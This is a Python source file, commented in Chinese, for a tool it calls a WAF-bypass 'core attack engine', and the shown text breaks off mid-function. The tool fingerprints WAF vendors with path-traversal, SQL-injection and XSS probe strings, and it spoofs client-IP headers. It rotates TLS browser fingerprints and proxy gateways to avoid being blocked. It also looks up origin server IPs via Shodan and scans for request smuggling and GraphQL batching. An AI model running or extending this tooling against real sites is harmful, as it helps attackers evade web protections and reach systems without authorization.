
#!/usr/bin/env python3
"""
WAF绕过
pip install aiohttp dnspython shodan mmh3
"""
import logging 
import asyncio
import ssl
import socket
import hashlib
import base64
import warnings
import time
import os
from functools import wraps
from typing import Any, Callable

# 导入重构后的代理网关
try:
    from .dynamic_ip_pool import init_proxy_gateway, get_proxy_session, get_gateway_stats, force_switch_gateway
    PROXY_AVAILABLE = True
except ImportError:
    try:
        from dynamic_ip_pool import init_proxy_gateway, get_proxy_session, get_gateway_stats, force_switch_gateway
        PROXY_AVAILABLE = True
    except ImportError:
        PROXY_AVAILABLE = False
        print("[!] 代理网关模块未找到，将使用直连模式")

# 核心依赖检查
try:
    import aiohttp
except ImportError:
    print("[!] 缺少aiohttp库，安装: pip install aiohttp")
    raise

try:
    import aiohttp_socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] 缺少aiohttp_socks库，代理SSL连接受限: pip install aiohttp_socks")

try:
    import dns.resolver
except ImportError:
    print("[!] 缺少dnspython库，安装: pip install dnspython")
    raise

# 尝试导入mmh3，如果不存在则使用备用方案
try:
    import mmh3
    HAS_MMH3 = True
except ImportError:
    HAS_MMH3 = False
    # 简单的备用哈希函数
    def mmh3_hash_fallback(data):
        return hash(data) & 0x7FFFFFFF  # 返回正整数
import urllib.parse
import json
import re
import time
import random
import difflib
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
import ipaddress
from collections import defaultdict
import struct

# 尝试导入可选依赖
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("[!] Shodan库未安装，部分源站发现功能受限")

# 尝试导入tls-client（绕过率提升关键）
try:
    import tls_client
    TLS_CLIENT_AVAILABLE = True
    print("[+] TLS-Client已加载 - 绕过率提升模式启用!")
except ImportError:
    TLS_CLIENT_AVAILABLE = False
    print("[!] TLS-Client库未安装，使用传统方法 (pip install tls-client)")

@dataclass
class BypassResult:
    """绕过结果"""
    success: bool
    method: str
    url: str
    details: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0
    risk_level: str = "medium"
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class SmugglingResult:
    """HTTP请求走私扫描结果"""
    vulnerable: bool = False
    technique: Optional[str] = None
    evidence: str = ""
    baseline_status: int = 0
    confirmation_status: int = 0
    baseline_time: float = 0.0
    confirmation_time: float = 0.0
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class GraphQLResult:
    """GraphQL批处理漏洞扫描结果"""
    vulnerable: bool = False
    endpoint: Optional[str] = None
    evidence: str = ""
    successful_queries_in_batch: int = 0
    total_queries_in_batch: int = 0
    confidence: float = 0.0
    introspection_available: bool = False
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class OriginServer:
    """源站信息"""
    ip: str
    confidence: float
    discovery_method: str
    ports: List[int] = field(default_factory=list)
    services: Dict[str, str] = field(default_factory=dict)
    is_verified: bool = False

class _ConfidenceScorer:
    """
    【数学核心】
    基于多维度证据，动态评估绕过结果的置信度。
    """
    def __init__(self):
        # 1. 定义不同绕过方法的初始权重（基础分）
        self.METHOD_WEIGHTS = {
            'direct_origin_enhanced': 0.95, # 源站直连，最高置信度
            'http_smuggling_enhanced': 0.9,   # 请求走私，高置信度
            'graphql_batch_enhanced': 0.85,   # GraphQL批处理，高置信度
            'websocket': 0.8,                 # WebSocket 绕过
            'encoding_bypass_enhanced': 0.7,  # 编码绕过
            'header_manipulation_enhanced': 0.6, # 头部操纵
            'method_override': 0.55,          # 方法覆盖
            'edge_cases': 0.5,                # 边缘案例
            'default': 0.5                    # 其他/未知方法
        }

    def _calculate_response_similarity(self, content_a: str, content_b: str) -> float:
        """计算两个页面内容的相似度，返回 0.0 (完全不同) 到 1.0 (完全相同)"""
        if not content_a or not content_b:
            return 0.0
        return difflib.SequenceMatcher(None, content_a, content_b).ratio()

    def _calculate_content_quality(self, content: str) -> float:
        """评估响应内容的质量，返回 0.0 (低质量) 到 1.0 (高质量)"""
        if not content or len(content) < 100:
            return 0.1 # 内容过短，可能是错误信息
        
        score = 0.3
        if '<html>' in content.lower(): score += 0.2
        if '<body>' in content.lower(): score += 0.2
        if '<title>' in content.lower(): score += 0.2
        if len(content) > 1000: score += 0.1
        
        return score

    def _check_waf_residue(self, content: str, headers: dict) -> float:
        """检查WAF特征残留，返回惩罚分数 (0.0 到 1.0)"""
        # (这个函数可以复用 _fingerprint_waf_enhanced 的逻辑)
        penalty = 0.0
        text_lower = content.lower()
        
        # 示例：检查Cloudflare残留
        if 'cf-ray' in headers or 'cloudflare' in text_lower or '__cf_bm' in headers.get('Set-Cookie', ''):
            penalty = 0.5 # 如果还有Cloudflare特征，说明没完全绕过
            
        return penalty

    def assess(self, bypass_result: BypassResult, waf_block_page_content: str = "") -> float:
        """
        主评估方法，计算最终置信度分数。
        """
        # 1. 获取初始权重
        initial_weight = self.METHOD_WEIGHTS.get(bypass_result.method, self.METHOD_WEIGHTS['default'])
        
        # 2. 计算响应相似度惩罚
        # 相似度越高，得分越低。所以我们用 (1 - 相似度)
        similarity_score = 1.0 - self._calculate_response_similarity(
            bypass_result.details.get('content', ''), 
            waf_block_page_content
        )
        
        # 3. 计算内容质量得分
        quality_score = self._calculate_content_quality(bypass_result.details.get('content', ''))
        
        # 4. 计算WAF残留惩罚
        residue_penalty = self._check_waf_residue(
            bypass_result.details.get('content', ''),
            bypass_result.details.get('headers', {})
        )
        
        # 最终得分计算 (加权 & 惩罚)
        final_confidence = (initial_weight * 0.5 + 
                           similarity_score * 0.2 + 
                           quality_score * 0.3) - residue_penalty

        # 确保分数在 0.0 到 1.0 之间
        return max(0.0, min(1.0, final_confidence))

class WAFBypasser:
    """WAF绕过器 - 核心攻击引擎"""
    
    def __init__(self, shodan_api_key: str = None):
        # 【新增】设置日志记录器
        self.logger = logging.getLogger("WAFBypasser")
        if not self.logger.handlers:  # 防止重复添加handler
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # 如果没有提供密钥，自动从环境变量读取
        if shodan_api_key is None:
            shodan_api_key = os.environ.get('SHODAN_API_KEY')
        self.shodan_api_key = shodan_api_key
        self.shodan_client = None
        if SHODAN_AVAILABLE and shodan_api_key:
            try:
                self.shodan_client = shodan.Shodan(shodan_api_key)
                self.logger.info(f"[+] Shodan API初始化成功: {shodan_api_key[:8]}...")
            except Exception as e:
                self.logger.error(f"[!] Shodan API初始化失败: {e}")
                self.shodan_client = None
        elif not SHODAN_AVAILABLE:
            self.logger.warning("[!] Shodan库未安装，高级功能受限")
        elif not shodan_api_key:
            self.logger.warning("[!] 未提供Shodan API密钥，部分功能受限")
        
        # 动态置信度评估器
        self.scorer = _ConfidenceScorer()
        
        # 结果缓存系统
        self._cache = {
            'dns': {},      # DNS查询缓存
            'jarm': {},     # JARM指纹缓存
            'waf': {},      # WAF识别缓存
            'ssl_san': {},  # SSL证书缓存
            'favicon': {},  # Favicon哈希缓存
            'headers': {}   # 响应头缓存
        }
        self._cache_ttl = 3600  # 1小时过期
        self._cache_hits = 0
        self._cache_misses = 0
        
        # 绕过请求头集合
        self.bypass_headers = {
            # IP欺骗头
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Host': 'localhost',
            
            # 方法覆盖头
            'X-HTTP-Method-Override': 'GET',
            'X-HTTP-Method': 'GET',
            'X-Method-Override': 'GET',
            
            # 缓存绕过
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            
            # 其他有用的头
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Port': '443',
            'X-Frame-Options': 'SAMEORIGIN'
        }
        
        # WAF指纹库
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['CF-RAY', 'CF-Cache-Status', 'cf-request-id'],
                'cookies': ['__cfduid', 'cf_clearance'],
                'errors': ['Attention Required!', 'cf-browser-verification', 'cloudflare'],
                'server': ['cloudflare'],
                'bypass_priority': ['origin_ip', 'websocket', 'graphql', 'cache_poison']
            },
            'akamai': {
                'headers': ['X-Akamai-Transformed', 'Akamai-Origin-Hop'],
                'cookies': ['akamai_'],
                'server': ['AkamaiGHost'],
                'bypass_priority': ['origin_ip', 'method_override', 'path_confusion']
            },
            'aws_waf': {
                'headers': ['X-AMZ-CF-ID', 'X-Amzn-Trace-Id'],
                'cookies': ['AWSALB'],
                'server': ['Amazon CloudFront'],
                'bypass_priority': ['json_smuggling', 'xml_entity', 'graphql_batch']
            },
            'sucuri': {
                'headers': ['X-Sucuri-ID', 'X-Sucuri-Cache'],
                'server': ['Sucuri/CloudProxy'],
                'bypass_priority': ['origin_ip', 'encoding_bypass']
            },
            'incapsula': {
                'headers': ['X-Iinfo', 'X-CDN'],
                'cookies': ['incap_ses_', 'visid_incap_'],
                'server': ['Incapsula'],
                'bypass_priority': ['origin_ip', 'javascript_bypass']
            },
            'f5_bigip': {
                'cookies': ['BIGipServer', 'F5-TrafficShield'],
                'headers': ['X-Cnection', 'X-F5-Auth-Token'],
                'bypass_priority': ['chunked_encoding', 'http_smuggling']
            },
            'barracuda': {
                'cookies': ['barra'],
                'server': ['Barracuda'],
                'bypass_priority': ['method_override', 'path_normalization']
            },
            'modsecurity': {
                'errors': ['ModSecurity', 'Mod_Security'],
                'server': ['Mod_Security'],
                'bypass_priority': ['encoding_bypass', 'comment_injection']
            }
        }
        
        # 编码器集合
        self.encoders = {
            'url': self._url_encode,
            'double_url': self._double_url_encode,
            'unicode': self._unicode_encode,
            'utf8_overlong': self._utf8_overlong_encode,
            'mixed_case': self._mixed_case_encode,
            'html_entity': self._html_entity_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode
        }
        
        # TLS-Client 浏览器配置文件 - 10种指纹极致优化
        self.browser_profiles = {
            # 现代主流浏览器
            'chrome_120': {
                'identifier': 'chrome_120',
                'description': 'Chrome 120 - 最新Chrome指纹',
                'priority': 1,
                'category': 'modern'
            },
            'firefox_119': {
                'identifier': 'firefox_119', 
                'description': 'Firefox 119 - 最新Firefox指纹',
                'priority': 2,
                'category': 'modern'
            },
            'safari_17': {
                'identifier': 'safari_17',
                'description': 'Safari 17 - macOS指纹',
                'priority': 3,
                'category': 'modern'
            },
            'edge_120': {
                'identifier': 'edge_120',
                'description': 'Edge 120 - Windows指纹',
                'priority': 4,
                'category': 'modern'
            },
            'opera_105': {
                'identifier': 'opera_105',
                'description': 'Opera 105 - 少见指纹',
                'priority': 5,
                'category': 'modern'
            },
            
            # 移动端浏览器指纹
            'chrome_android': {
                'identifier': 'chrome_android',
                'description': 'Chrome Android - 移动端指纹',
                'priority': 6,
                'category': 'mobile'
            },
            'safari_ios': {
                'identifier': 'safari_ios',
                'description': 'Safari iOS - iPhone指纹',
                'priority': 7,
                'category': 'mobile'
            },
            
            # 传统/旧版浏览器 (绕过现代检测)
            'chrome_112': {
                'identifier': 'chrome_112',
                'description': 'Chrome 112 - 旧版Chrome指纹',
                'priority': 8,
                'category': 'legacy'
            },
            'firefox_102': {
                'identifier': 'firefox_102',
                'description': 'Firefox 102 - 旧版Firefox指纹',
                'priority': 9,
                'category': 'legacy'
            },
            
            # 特殊/罕见浏览器 (绕过指纹库)
            'okhttp': {
                'identifier': 'okhttp',
                'description': 'OkHttp - Android应用常用',
                'priority': 10,
                'category': 'special'
            }
        }
        
        # 初始化TLS-Client会话
        self.tls_sessions = {}
        if TLS_CLIENT_AVAILABLE:
            self.logger.info("[*] 初始化TLS-Client浏览器指纹...")
            for profile_name, profile_config in self.browser_profiles.items():
                try:
                    session = tls_client.Session(
                        client_identifier=profile_config['identifier'],
                        random_tls_extension_order=True
                    )
                    self.tls_sessions[profile_name] = session
                    self.logger.info(f"    [+] {profile_config['description']}")
                except Exception as e:
                    self.logger.error(f"    [!] {profile_name} 初始化失败: {e}")
        else:
            self.logger.warning("[!] TLS-Client未可用，使用传统aiohttp方法")
        
        # 指纹轮换机制 - 防止被WAF识别
        self.profile_rotation = {
            'current_profile': 'chrome_120',
            'rotation_count': 0,
            'max_uses_per_profile': 3,  # 每个指纹最多用3次就轮换
            'blocked_profiles': set(),  # 被封的指纹
            'success_rates': defaultdict(float)  # 各指纹成功率
        }
        
        # 统计信息
        self.stats = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'origin_ips_found': 0,
            'waf_types_encountered': set(),
            'tls_client_successes': 0,
            'traditional_method_successes': 0,
            'profile_usage': defaultdict(int),  # 各指纹使用次数
            'profile_success': defaultdict(int)  # 各指纹成功次数
        }


    async def _make_tls_request(self, url: str, headers: Dict = None, method: str = 'GET', 
                              profile: str = 'chrome_120', use_proxy: bool = False, **kwargs) -> Dict[str, Any]:
        """TLS-Client异步包装器 - 核心绕过增强"""
        if not TLS_CLIENT_AVAILABLE or profile not in self.tls_sessions:
            # 回退到传统方法
            return await self._make_traditional_request(url, headers, method, use_proxy, **kwargs)
        
        try:
            # 准备请求参数
            request_headers = self.bypass_headers.copy()
            if headers:
                request_headers.update(headers)
            
            # 使用 asyncio.to_thread 包装同步调用
            session = self.tls_sessions[profile]
            
            if method.upper() == 'GET':
                response = await asyncio.to_thread(
                    session.get,
                    url,
                    headers=request_headers,
                    timeout_seconds=30,
                    **kwargs
                )
            elif method.upper() == 'POST':
                response = await asyncio.to_thread(
                    session.post,
                    url,
                    headers=request_headers,
                    timeout_seconds=30,
                    **kwargs
                )
            elif method.upper() == 'TRACE':
                # TRACE方法使用execute_request
                response = await asyncio.to_thread(
                    session.execute_request,
                    'TRACE',  # method是第一个参数
                    url,      # url是第二个参数  
                    headers=request_headers,
                    timeout_seconds=30
                )
            else:
                # 其他HTTP方法 - 统一使用execute_request
                method_lower = method.lower()
                
                # 检查是否是支持的标准方法
                standard_methods = ['head', 'options', 'put', 'patch', 'delete']
                
                if method_lower in standard_methods and hasattr(session, method_lower):
                    # 使用专用方法
                    response = await asyncio.to_thread(
                        getattr(session, method_lower),
                        url,
                        headers=request_headers,
                        timeout_seconds=30,
                        **kwargs
                    )
                elif hasattr(session, 'execute_request'):
                    # 使用通用execute_request方法
                    response = await asyncio.to_thread(
                        session.execute_request,
                        method.upper(),  # method是第一个参数
                        url,            # url是第二个参数
                        headers=request_headers,
                        timeout_seconds=30
                    )
                else:
                    self.logger.warning(f"[!] {method}方法不支持，跳过此探测")
                    raise AttributeError(f"{method} method not supported by tls_client")
            
            # 统计TLS-Client成功
            self.stats['tls_client_successes'] += 1
            
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'text': response.text,
                'content': response.content,
                'url': response.url,
                'method': 'tls_client',
                'profile': profile
            }
            
        except Exception as e:
            self.logger.warning(f"[!] TLS-Client请求失败 ({profile}): {e}")
            # 回退到传统方法
            use_proxy = kwargs.pop('use_proxy', False)  # 提取代理参数
            return await self._make_traditional_request(url, headers, method, use_proxy, **kwargs)
    
    async def _make_traditional_request(self, url: str, headers: Dict = None, 
                                      method: str = 'GET', use_proxy: bool = False, **kwargs) -> Dict[str, Any]:
        """传统aiohttp请求方法 - 支持代理网关"""
        try:
            request_headers = self.bypass_headers.copy()
            if headers:
                request_headers.update(headers)
            
            # 代理模式
            if use_proxy and PROXY_AVAILABLE:
                result = await get_proxy_session()
                if result:
                    session, proxy_url = result
                    try:
                        async with getattr(session, method.lower())(
                            url,
                            headers=request_headers,
                            ssl=False,
                            timeout=aiohttp.ClientTimeout(total=30),
                            proxy=proxy_url,  # 使用代理
                            **kwargs
                        ) as resp:
                            text = await resp.text()
                            content = await resp.read()
                            
                            self.stats['traditional_method_successes'] += 1
                            
                            return {
                                'status_code': resp.status,
                                'headers': dict(resp.headers),
                                'text': text,
                                'content': content,
                                'url': str(resp.url),
                                'method': 'aiohttp_proxy',
                                'profile': 'traditional_proxy',
                                'proxy_used': proxy_url
                            }
                    finally:
                        await session.close()
                else:
                    self.logger.warning("⚠️ 无法获取代理会话，回退到直连模式")
            
            # 直连模式（默认或代理失败时的备用）
            async with aiohttp.ClientSession() as session:
                async with getattr(session, method.lower())(
                    url,
                    headers=request_headers,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=30),
                    **kwargs
                ) as resp:
                    text = await resp.text()
                    content = await resp.read()
                    
                    self.stats['traditional_method_successes'] += 1
                    
                    return {
                        'status_code': resp.status,
                        'headers': dict(resp.headers),
                        'text': text,
                        'content': content,
                        'url': str(resp.url),
                        'method': 'aiohttp',
                        'profile': 'traditional'
                    }
        except Exception as e:
            # 如果是代理相关错误，尝试切换代理
            if use_proxy and PROXY_AVAILABLE and any(proxy_error in str(e).lower() 
                                                    for proxy_error in ['proxy', 'connection', 'timeout']):
                self.logger.warning(f"⚠️ 代理请求失败，强制切换代理: {e}")
                force_switch_gateway()
            
            return {
                'status_code': 0,
                'headers': {},
                'text': '',
                'content': b'',
                'url': url,
                'method': 'failed',
                'error': str(e)
            }

    async def _get_target_fingerprint(self, url: str, use_proxy: bool = False) -> Dict[str, Any]:
        """获取目标站点的独特指纹用于验证 - 使用TLS-Client增强"""
        fingerprint = {
            'title': None,
            'meta_keywords': None,
            'meta_description': None,
            'static_resources': [],
            'body_size_range': (0, 0),
            'unique_headers': {},
            'dom_patterns': []
        }
        
        try:
            # 优先使用TLS-Client获取指纹
            resp = await self._make_tls_request(url, profile='chrome_120', use_proxy=use_proxy)
            
            if resp['status_code'] == 200:
                content = resp['text']
                
                # 提取页面标题
                import re
                title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
                if title_match:
                    fingerprint['title'] = title_match.group(1).strip()
                
                # 提取meta标签
                meta_keywords = re.search(r'<meta\s+name=["\']keywords["\']\s+content=["\'](.*?)["\']', content, re.IGNORECASE)
                if meta_keywords:
                    fingerprint['meta_keywords'] = meta_keywords.group(1)
                
                meta_desc = re.search(r'<meta\s+name=["\']description["\']\s+content=["\'](.*?)["\']', content, re.IGNORECASE)
                if meta_desc:
                    fingerprint['meta_description'] = meta_desc.group(1)
                
                # 提取静态资源
                js_files = re.findall(r'<script[^>]+src=["\'](/[^"\']+\.js[^"\']*)["\']', content)
                css_files = re.findall(r'<link[^>]+href=["\'](/[^"\']+\.css[^"\']*)["\']', content)
                fingerprint['static_resources'] = list(set(js_files[:5] + css_files[:5]))
                
                # 响应大小范围（±30%）
                body_size = len(content)
                fingerprint['body_size_range'] = (int(body_size * 0.7), int(body_size * 1.3))
                
                # 独特响应头
                for header, value in resp['headers'].items():
                    if header.lower() not in ['date', 'content-length', 'connection', 'server']:
                        fingerprint['unique_headers'][header] = value
                
                # DOM模式（检查特定class或id）
                unique_ids = re.findall(r'id=["\']([\w\-]+)["\']', content)[:5]
                unique_classes = re.findall(r'class=["\']([\w\-\s]+)["\']', content)[:5]
                fingerprint['dom_patterns'] = list(set(unique_ids + unique_classes))
                
                self.logger.info(f"[+] 目标指纹获取成功 (使用: {resp['method']}-{resp['profile']})")
            else:
                self.logger.warning(f"[!] 目标指纹获取失败: HTTP {resp['status_code']}")
                    
        except Exception as e:
            self.logger.error(f"[!] 获取目标指纹失败: {e}")
        
        self._target_fingerprint = fingerprint
        return fingerprint


    async def auto_bypass(self, target_url: str, aggressive: bool = False, use_proxy: bool = False) -> Dict[str, Any]:
        """智能自动绕过 - 核心方法 (TLS-Client增强版 + 代理网关)"""
        self.stats['total_attempts'] += 1
        
        # 检查代理网关状态（主程序可能已经初始化过了）
        if use_proxy and PROXY_AVAILABLE:
            # 检查代理网关是否已经可用
            try:
                stats = get_gateway_stats()
                if stats.get('总网关数', 0) > 0:
                    self.logger.info(f"🚀 代理网关已就绪 (网关数: {stats['总网关数']})")
                else:
                    self.logger.info("🚀 初始化代理网关...")
                    if not init_proxy_gateway():
                        self.logger.warning("⚠️ 代理网关初始化失败，将使用直连模式")
                        use_proxy = False
                    else:
                        self.logger.info("✅ 代理网关就绪")
            except:
                self.logger.warning("⚠️ 代理网关检查失败，使用直连模式")
                use_proxy = False
        
        results = {
            'target': target_url,
            'waf_detected': None,
            'origin_servers': [],
            'successful_bypasses': [],
            'failed_attempts': [],
            'recommendations': [],
            'tls_profiles_tested': [],
            'proxy_enabled': use_proxy,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # 新增：首先获取目标指纹
            fingerprint_method = "(TLS-Client增强 + 代理网关)" if use_proxy else "(TLS-Client增强)"
            self.logger.info(f"\n[*] 获取目标站点指纹 {fingerprint_method}...")
            await self._get_target_fingerprint(target_url, use_proxy=use_proxy)
            
            # 1. WAF指纹识别 - 使用多浏览器指纹
            self.logger.info(f"\n[*] 开始WAF绕过分析: {target_url}")
            waf_type = await self._fingerprint_waf_enhanced(target_url, use_proxy=use_proxy)
            results['waf_detected'] = waf_type
            
            if waf_type:
                self.stats['waf_types_encountered'].add(waf_type)
                self.logger.info(f"[+] 检测到WAF类型: {waf_type}")
            else:
                self.logger.warning("[!] 未检测到明显的WAF特征")
            
            # 2. 源站发现
            discovery_method = "(代理网关模式)" if use_proxy else "(直连模式)"
            self.logger.info(f"\n[*] 尝试发现源站IP {discovery_method}...")
            origin_servers = await self._discover_origin_comprehensive(target_url, use_proxy=use_proxy)
            results['origin_servers'] = [
                {
                    'ip': server.ip,
                    'confidence': server.confidence,
                    'method': server.discovery_method,
                    'verified': server.is_verified
                }
                for server in origin_servers
            ]
            
            if origin_servers:
                self.stats['origin_ips_found'] += len(origin_servers)
                self.logger.info(f"[+] 发现 {len(origin_servers)} 个潜在源站IP")
            
            # ====================================================================
            # 【核心修正】将复杂的扫描器从策略循环中移出，只执行一次
            # ====================================================================
            
            # 3. 独立执行HTTP请求走私扫描 (只扫一次)
            smuggling_method = "[代理模式]" if use_proxy else "[直连模式]"
            self.logger.info(f"\n[*] [独立扫描] 执行HTTP请求走私漏洞扫描 {smuggling_method}...")
            smuggling_scan_result = await self.scan_for_smuggling(target_url, use_proxy=use_proxy)
            results['smuggling_scan'] = {
                'vulnerable': smuggling_scan_result.vulnerable,
                'technique': smuggling_scan_result.technique,
                'evidence': smuggling_scan_result.evidence,
                'baseline_status': smuggling_scan_result.baseline_status,
                'confirmation_status': smuggling_scan_result.confirmation_status,
                'baseline_time': smuggling_scan_result.baseline_time,
                'confirmation_time': smuggling_scan_result.confirmation_time
            }
            if smuggling_scan_result.vulnerable:
                self.logger.error(f"[!!!] 独立走私扫描发现漏洞: {smuggling_scan_result.technique}")
                self.logger.error(f"[!!!] 证据: {smuggling_scan_result.evidence}")
                results['successful_bypasses'].append({
                    'method': 'http_smuggling_scan',
                    'url': target_url,
                    'confidence': 0.9,
                    'details': vars(smuggling_scan_result)
                })
                self.stats['successful_bypasses'] += 1
            
            # 4. 独立执行GraphQL扫描 (只扫一次)
            graphql_method = "[代理模式]" if use_proxy else "[直连模式]"
            self.logger.info(f"\n[*] [独立扫描] 执行GraphQL批处理漏洞扫描 {graphql_method}...")
            graphql_scan_result = await self.scan_for_graphql_batching(target_url, use_proxy=use_proxy)
            results['graphql_scan'] = {
                'vulnerable': graphql_scan_result.vulnerable,
                'endpoint': graphql_scan_result.endpoint,
                'evidence': graphql_scan_result.evidence,
                'successful_queries': graphql_scan_result.successful_queries_in_batch,
                'total_queries': graphql_scan_result.total_queries_in_batch,
                'confidence': graphql_scan_result.confidence,
                'introspection_available': graphql_scan_result.introspection_available
            }
            if graphql_scan_result.vulnerable:
                self.logger.error(f"[!!!] 独立GraphQL扫描发现漏洞: {graphql_scan_result.endpoint}")
                self.logger.error(f"[!!!] 证据: {graphql_scan_result.evidence}")
                self.logger.error(f"[!!!] 置信度: {graphql_scan_result.confidence:.2f}")
                results['successful_bypasses'].append({
                    'method': 'graphql_batch_scan',
                    'url': graphql_scan_result.endpoint or target_url,
                    'confidence': graphql_scan_result.confidence,
                    'details': vars(graphql_scan_result)
                })
                self.stats['successful_bypasses'] += 1
            
            # ====================================================================
            # 5. 执行简单绕过策略循环 (避免无限循环)
            # ====================================================================
            simple_strategies = self._build_simple_bypass_strategy(waf_type, aggressive)
            
            self.logger.info(f"\n[*] 执行简单绕过策略循环 (共{len(simple_strategies)}种策略)...")
            for strategy in simple_strategies:
                result = await self._execute_bypass_strategy_enhanced(target_url, strategy, origin_servers, use_proxy=use_proxy)
                if result.success:
                    # 【数学核心】动态重新评估置信度
                    original_confidence = result.confidence
                    result.confidence = self.scorer.assess(result, waf_block_page_content="")
                    self.logger.info(f"    [评估] {result.method}: {original_confidence:.2f} -> {result.confidence:.2f}")
                    
                    results['successful_bypasses'].append({
                        'method': result.method,
                        'url': result.url,
                        'confidence': result.confidence,
                        'details': result.details
                    })
                    self.stats['successful_bypasses'] += 1
                else:
                    results['failed_attempts'].append({
                        'method': result.method,
                        'reason': result.details.get('error', 'Unknown')
                    })
            
            # 6. 记录测试的TLS配置文件
            results['tls_profiles_tested'] = list(self.tls_sessions.keys())
            
            # 7. 生成建议
            results['recommendations'] = self._generate_recommendations(results)
            
        except Exception as e:
            results['error'] = str(e)
            self.logger.error(f"[!] 绕过过程出错: {e}")
        
        return results
    
    async def _fingerprint_waf_enhanced(self, url: str, use_proxy: bool = False) -> Optional[str]:
        """增强WAF指纹识别 - 使用多浏览器TLS指纹"""
        # 使用缓存
        return await self._cached_operation(
            'waf',
            url,
            self._fingerprint_waf_enhanced_impl,
            url,
            use_proxy
        )
    
    async def _fingerprint_waf_enhanced_impl(self, url: str, use_proxy: bool = False) -> Optional[str]:
        """增强WAF指纹识别实现 - 多浏览器探测"""
        # 发送多个探测请求，使用不同浏览器指纹
        probes = [
            {'path': '/', 'method': 'GET', 'profile': 'chrome_120'},
            {'path': '/../../etc/passwd', 'method': 'GET', 'profile': 'firefox_119'},  # 路径遍历
            {'path': '/?id=1\'', 'method': 'GET', 'profile': 'safari_17'},  # SQL注入
            {'path': '/', 'method': 'TRACE', 'profile': 'edge_120'},  # 方法探测
            {'path': '/<script>alert(1)</script>', 'method': 'GET', 'profile': 'opera_105'}  # XSS
        ]
        
        detected_wafs = defaultdict(int)
        
        for probe in probes:
            try:
                target = url.rstrip('/') + probe['path']
                
                # 使用TLS-Client发送请求
                resp = await self._make_tls_request(
                    target,
                    method=probe['method'],
                    profile=probe['profile'],
                    use_proxy=use_proxy,
                    allow_redirects=False
                )
                
                headers = resp['headers']
                text = resp['text']
                server = headers.get('Server', '').lower()
                
                # 检查每个WAF的特征
                for waf_name, signatures in self.waf_signatures.items():
                    score = 0
                    
                    # 检查响应头
                    for header in signatures.get('headers', []):
                        if any(h.lower() == header.lower() for h in headers):
                            score += 2
                    
                    # 检查错误信息
                    for error in signatures.get('errors', []):
                        if error.lower() in text.lower():
                            score += 3
                    
                    # 检查Server头
                    for server_sig in signatures.get('server', []):
                        if server_sig.lower() in server:
                            score += 2
                    
                    if score > 0:
                        detected_wafs[waf_name] += score
                        self.logger.info(f"    [WAF] {waf_name} 得分: +{score} (使用: {probe['profile']})")
            
            except Exception as e:
                self.logger.warning(f"    [!] 探测失败 ({probe['profile']}): {e}")
                continue
        
        # 返回得分最高的WAF
        if detected_wafs:
            best_waf = max(detected_wafs.items(), key=lambda x: x[1])
            self.logger.info(f"[+] WAF识别结果: {best_waf[0]} (总分: {best_waf[1]})")
            return best_waf[0]
        
        return None
    
    async def _execute_bypass_strategy_enhanced(self, url: str, strategy: Dict, 
                                             origin_servers: List[OriginServer], use_proxy: bool = False) -> BypassResult:
        """增强策略执行 - TLS-Client多指纹轮换"""
        try:
            self.logger.info(f"[*] 尝试绕过方法: {strategy['name']} (TLS-Client增强)")
            
            # 为不同策略选择最优浏览器指纹
            optimal_profiles = self._select_optimal_profiles(strategy['name'])
            
            # 智能指纹轮换 - 防止被封
            for attempt in range(len(optimal_profiles)):
                # 使用智能轮换选择最佳指纹
                profile = self._get_optimal_profile_with_rotation(strategy['name'])
                profile_desc = self.browser_profiles.get(profile, {}).get('description', profile)
                self.logger.info(f"    [*] 使用浏览器指纹: {profile_desc} (尝试 {attempt + 1})")
                
                try:
                    if strategy['name'] == 'direct_origin':
                        result = await self._bypass_via_origin_ip_enhanced(url, origin_servers, profile, use_proxy)
                    elif strategy['name'] == 'header_manipulation':
                        result = await self._bypass_via_headers_enhanced(url, profile, use_proxy)
                    elif strategy['name'] == 'encoding_bypass':
                        result = await self._bypass_via_encoding_enhanced(url, profile, use_proxy)
                    else:
                        # 传统方法作为备用
                        if strategy['name'] == 'direct_origin':
                            result = await strategy['function'](url, origin_servers)
                        else:
                            result = await strategy['function'](url)
                    
                    # 记录使用结果
                    self._record_profile_result(profile, result.success, 
                                              result.details.get('error'))
                    
                    # 如果成功，记录使用的浏览器指纹
                    if result.success:
                        result.details['browser_profile'] = profile
                        result.details['tls_enhanced'] = True
                        result.details['rotation_attempt'] = attempt + 1
                        self.logger.info(f"[+] 绕过成功: {strategy['name']} (指纹: {profile})")
                        return result
                    else:
                        self.logger.warning(f"    [-] {profile} 失败: {result.details.get('error', '未知原因')}")
                        
                        # 如果是被封迹象，立即轮换到下一个指纹
                        error_msg = result.details.get('error', '')
                        if any(sign in error_msg.lower() for sign in ['blocked', 'rate limit']):
                            self.logger.warning(f"    [!] 检测到封禁迹象，立即轮换指纹")
                            self.profile_rotation['blocked_profiles'].add(profile)
                
                except Exception as e:
                    error_str = str(e)
                    self._record_profile_result(profile, False, error_str)
                    self.logger.error(f"    [!] 指纹 {profile} 执行异常: {type(e).__name__} - {e}")
                    continue
            
            # 所有指纹都失败
            return BypassResult(
                success=False,
